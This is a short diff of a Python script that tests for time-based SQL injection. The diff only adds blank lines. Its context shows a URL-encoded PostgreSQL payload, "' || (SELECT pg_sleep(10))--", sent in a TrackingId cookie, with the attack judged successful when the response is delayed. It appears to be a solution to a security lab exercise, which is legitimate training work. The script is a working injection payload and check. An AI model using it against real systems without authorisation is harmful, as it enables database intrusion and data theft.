@@ -6,10 +6,12 @@ def time_based_sqli_check(url):
     encoded_payload = requests.utils.quote("' || (SELECT pg_sleep(10))--")
     response = requests.get(url, cookies={'TrackingId': encoded_payload})
 
+
     if response.elapsed.total_seconds() > 10:
         print("Time based SQL injection attack successfully completed.")
     else:
         print("Attack has not been successfully carried out. Please check your url and try again.")
+
 
 
 def main():
